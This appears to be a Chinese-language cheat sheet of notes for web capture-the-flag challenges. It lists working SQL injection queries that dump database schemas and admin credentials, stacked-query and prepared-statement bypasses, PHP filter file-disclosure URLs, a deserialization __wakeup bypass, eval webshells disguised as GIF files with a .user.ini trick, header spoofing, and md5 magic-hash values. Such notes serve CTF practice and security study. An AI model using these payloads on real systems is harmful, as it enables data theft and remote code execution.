* web题目，flag文件一般认为在根目录，web服务文件在／var/www/html/目录。上传payload后看不到flag时，看下源码，说不定就有了。

* 在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符.

* 常规注入

  ```shell
  #爆出所有库名
  ?id=0 union select 1,group_concat(distinct table_schema) from information_schema.columns
  #爆出数据库news的所有表名
  ?id=0 union select 1,group_concat(distinct table_name) from information_schema.columns where table_schema = 'news'
  #爆出表admin的所有列
  ?id=0 union select 1,group_concat(distinct column_name) from information_schema.columns where table_name = 'admin'
  #查username和password，中间用:隔开
  ?id=0 union select 1,group_concat(username,0x3a,password) from admin
  ```

* 数字注入

  hack world 1

* sql注入 尝试show tables；or；预处理语句；1' or 1=1;# 好用的语句。

  union 的用法值得研究一下，以及其他常用的注入手法。

  ```sql
  0';rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#

  char(115,101,108,101,99,116)<----->'select'

  1';PREPARE hacker from concat('s','elect', ' * from `1919810931114514` ');EXECUTE hacker;#

  ```

* web PHP filter 显示后台文件

  ```php
  YOUR_URL?file=php://filter/convert.base64-encode/resource=flag.php

  ?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=
  ```

* PHP

  ```php
  __wakeup()方法绕过
  作用：
  与__sleep()函数相反，__sleep()函数，是在序序列化时被自动调用。__wakeup()函数，在反序列化时，被自动调用。
  绕过：
  当反序列化字符串，表示属性个数的值大于真实属性个数时，会跳过 __wakeup 函数的执行。
  所以在上面name后面的2表示有2个属性，我们改成3之后他会绕过__wakeup()
    
  <?php
  class Name
  {
      private $username = 'admin';
      private $password = '100';
  }
  $a = new Name();
  echo serialize($a);
  #进行url编码，防止%00对应的不可打印字符在复制时丢失
  echo urlencode(serialize($a));
  #未编码的情况
  //O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";s:3:"100";}
  //Name后面的2在链接中要改成3
  ?>
  ```

* php 序列化 反序列化

  ```php
  #在本地执行出序列化结果，然后构造payload
  $password=new Flag();
  $password = serialize($password);
  echo $password; 
  ```

* search by python 

  开源项目 dirsearch

* url

  ```
  +    URL 中+号表示空格                                 %2B  
  空格 URL中的空格可以用+号或者编码           %20
  /   分隔目录和子目录                                     %2F    
  ?    分隔实际的URL和参数                             %3F    
  %    指定特殊字符                                          %25    
  #    表示书签                                                  %23    
  &    URL 中指定的参数间的分隔符                  %26    
  =    URL 中指定参数的值                                %3D

  $IFS$1可以代替空格
  ```

* 伪造headers

  ```shell
  Referer 伪造来自哪里
  X-Forwarded-For 伪造IP
  User-Agent 伪造浏览器
  ```

* webshell

  ```php
  <?php @eval($_POST[cmd]);?>
  GIF89a #伪装图片
  <script language='php'>eval($_POST['shell']);</script>

    .user.ini
  GIF89a                  
  auto_prepend_file=a.jpg
  .user.ini实际上就是一个可以由用户“自定义”的php.ini，我们可以自定义除了PHP_INI_SYSTEM以外的模式，在执行php代码之前，系统会对.user.ini先做一个执行，然后才执行其他的php文件。

  我们这边利用.user,ini先执行auto_prepend_file函数，auto_prepend_file表示在php程序加载第一个php代码前加载的php文件，也就是先加载了a.jpg里面的文件，即一句话木马。
  ```

* md5 注入

  ```
  ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ' or '6
  ```

* md5 collision

  ```
  s878926199a
  0e545993274517709034328855841020
  s155964671a
  0e342768416822451524974117254469
  s214587387a
  0e848240448830537924465865611904

  %4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
  %4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2

  0e1138100474 == md5(md5(0e1138100474)) == 0e779212254407018184727546255414
  0e215962017 == md5(0e215962017) == 0e291242476940776845150308577824
  ```

  ​

* robots.txt 

* 反序列化漏洞

* load_file()函数

  ```
  /view.php?no=0 union/**/select 1,load_file('/var/www/html/flag.php'),3,4
  ```

* ​

  ​